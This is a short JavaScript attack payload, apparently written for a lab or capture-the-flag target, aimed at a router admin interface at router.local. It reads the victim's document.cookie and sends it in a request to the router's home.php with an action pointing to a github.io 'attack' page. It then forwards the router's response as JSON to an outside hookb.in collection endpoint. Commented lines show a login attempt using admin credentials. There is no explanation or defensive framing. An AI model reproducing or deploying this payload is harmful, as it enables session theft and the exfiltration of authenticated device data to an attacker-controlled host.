const http = new XMLHttpRequest();
//http.open('POST', 'http://router.local/login.php', true);
//http://router.local/home.php?action=view&
//http://router.local/view.php
const cook = document.cookie;
http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true);

http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/YV0MqeVpzGhQERGGd0Bn', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.response));

};

http.send();
//http.send(cook+"&username=admin&pin=password&notRobot=on");

   

